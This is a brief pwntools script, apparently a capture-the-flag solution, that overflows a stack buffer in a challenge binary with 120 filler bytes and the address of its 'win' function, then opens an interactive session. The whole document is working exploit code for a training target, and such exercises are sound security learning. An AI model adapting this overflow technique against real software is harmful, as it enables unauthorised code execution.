from pwn import *

elf=ELF('/challenge/memeroyerors3.1')
p=elf.process()
p.recv()

p.sendline(b'128')
p.recv()
payload=b'a'*120+p64(elf.symbols.win)
p.sendline(payload)

p.interactive()